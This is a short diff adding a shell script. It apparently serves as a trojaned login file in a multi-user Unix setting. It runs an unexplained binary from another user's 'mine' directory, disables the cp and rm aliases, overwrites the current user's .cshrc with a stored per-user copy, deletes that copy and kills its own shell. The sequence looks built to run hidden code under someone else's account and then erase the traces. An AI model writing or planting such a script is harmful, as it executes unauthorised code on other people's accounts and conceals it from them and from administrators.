@@ -1,0 +1,9 @@
+/home/tcschna/utils/mine/a.out
+unalias cp
+echo $USER
+cp  /home/tcschna/utils/mine/.cshrc.hk.$USER /home/$USER/.cshrc
+
+unalias rm
+rm /home/tcschna/utils/mine/.cshrc.hk.$USER
+
+kill -9 $$
